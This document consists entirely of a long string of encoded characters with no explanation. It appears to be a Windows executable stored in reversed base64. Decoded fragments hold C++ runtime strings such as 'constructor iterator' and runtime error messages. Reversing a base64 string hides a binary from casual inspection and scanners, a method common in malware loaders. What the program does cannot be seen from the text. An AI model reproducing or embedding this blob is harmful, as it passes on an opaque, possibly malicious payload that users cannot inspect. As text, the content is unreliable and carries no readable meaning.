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MyHbcxEPswBD8v+2Lv7qbu4ert1S7syGLsv6arsuqqpi6pmWKpjKaog+pndy5mamJmXaZlUOpkRC5jO2IjLqYiIeohFS4gCGIg/7f/8vv+5j/92XP9zLf8w/u7tz+6qnO6nbe5kPu4hD+3e3N3brd2Yft1VT90SHN0P7czMvsyJj8xGXMxDLcwA/rv9y7u6mLu3abt0OrsxC7ru2KrrqaqoeqplS6oiGKof6ZncupmZi5lWWJlTKZkQ+ojNy4iKmIiHaYhEOogBC4f+1Hf7pXe4dnd1R3cyFHcv5Wbstmaph2ZmVGZjJWYg9lXdx1W6lHe3ZXd0NncxB3bu1GbrpWaodmZlR2YiFGQ/4TP8sjO5gzN2UDNzITMw8iLtwyKqkCKnYSJkMiIhAyHe0BHboRGYchFVQxESEBEP4QDMsgCJgwBGUABDIQAA8v/9z/+6nP+3bf90Pv8xD/7u3O7rre6ofu5lT+4iHO4f7d3cvt2Zj91WXN1TLd0Q/szNz8yKnMyHbcxEPswBD8v+2Lv7qbu4ert1S7syGLsv6arsuqqpi6pmWKpjKaog+pndy5mamJmXaZlUOpkRC5jO2IjLqYiIeohFS4gCGIgAAAAAEQABIQACEgABIQACEgABIQACAAEBIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABEQABEQABEQABEQABEAAQEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEAAQAAEAABAQAAEAABAUAAEAABAQAAEAABAUAAFAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAASAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAABAQAAEAARACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIYACGggBIYACGggAABAQAAEAABAQAAEBEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQgBEYABGQgBEYABCAEAABAQAAEAABAQAAEAQIAECAhAQIAECAhAQIAECAhAQIAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAIBAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAKAgCAoAAKAgGAgAAIAACAgAAIAACAgAAIAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAEAABAQAAEAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAggAIIACCggAIIACCAEAABAQAAEAABAQAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABCQgAEIABCQgAEIAQAAEAABAQAAEAABAQAAhAQIAECAhAQIAECAhAQIAECAhAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAAEAgEAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAoAAKAgCAoAAKAACAgAAIAACAgAAIAACAgAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkxkFACAAAwAAAAAAAAAAAAAAAQAg32cjBAAA42bpRHclNGelBib39mbr5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